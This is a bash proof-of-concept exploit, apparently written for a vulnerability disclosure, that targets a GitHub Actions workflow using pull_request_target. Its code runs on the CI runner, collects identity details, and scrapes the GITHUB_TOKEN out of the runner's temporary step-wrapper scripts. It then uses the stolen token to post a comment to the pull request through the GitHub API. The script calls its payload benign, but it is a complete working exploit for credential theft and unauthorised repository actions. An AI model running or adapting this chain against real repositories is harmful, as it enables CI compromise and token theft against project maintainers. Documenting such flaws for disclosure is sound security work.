#!/usr/bin/env bash
# Benign PoC for pull_request_target RCE in lint-commit.yml.
# Vector: package.json `scripts.commitlint` runs when the workflow invokes
# `yarn -s run commitlint -q` against the attacker-controlled checkout.
set -u

STAGE="${1:-unknown}"
MARK="/tmp/vane-poc.${STAGE}.flag"
[ -e "$MARK" ] && exit 0   # only fire once per stage
touch "$MARK"

# Force output to the runner stderr so it isn't swallowed by the
# workflow's `>> /dev/null 2>&1` (that redirect only wraps yarn add).
{
  echo "=================================================="
  echo "[PoC:${STAGE}] arbitrary code executing on the runner"
  echo "[PoC:${STAGE}] whoami: $(whoami 2>/dev/null || true)"
  echo "[PoC:${STAGE}] id:     $(id 2>/dev/null || true)"
  echo "[PoC:${STAGE}] pwd:    $(pwd)"
  echo "[PoC:${STAGE}] repo:   ${GITHUB_REPOSITORY:-?}"
  echo "[PoC:${STAGE}] event:  ${GITHUB_EVENT_NAME:-?}"
  echo "[PoC:${STAGE}] has GITHUB_TOKEN env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
  echo "=================================================="
} >&2

PR_NUM="$(jq -r '.pull_request.number // .number // empty' "${GITHUB_EVENT_PATH:-/dev/null}" 2>/dev/null || true)"
echo "[PoC:${STAGE}] PR number: ${PR_NUM:-unknown}" >&2

# GITHUB_TOKEN isn't in env (workflow inlined the secret as a literal into its
# step-wrapper script in /home/runner/work/_temp/). Recover it from there.
TOKEN=""
for f in /home/runner/work/_temp/*.sh; do
  [ -r "$f" ] || continue
  t=$(grep -oE 'Bearer [A-Za-z0-9_]+' "$f" 2>/dev/null | awk '{print $2}' | head -1)
  if [ -n "$t" ]; then
    TOKEN="$t"
    echo "[PoC:${STAGE}] recovered token from $f (len=${#TOKEN})" >&2
    break
  fi
done

if [ -n "${TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
  BODY='{"body":"🛑 **Proof-of-concept**: RCE + GITHUB_TOKEN exfiltration. This comment was posted by an attacker-controlled `scripts.commitlint` entry in `package.json`, executed by `lint-commit.yml` under `pull_request_target`. The token was recovered from the runner step-wrapper script. Payload benign — token used only to post this comment. Stage: '"${STAGE}"'."}'
  curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] HTTP %{http_code}\n" -X POST \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Accept: application/vnd.github+json" \
    -H "Content-Type: application/json" \
    -d "${BODY}" \
    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" >&2 || true
  head -c 200 /tmp/pwn-resp.json >&2 || true
  echo >&2
fi

exit 0
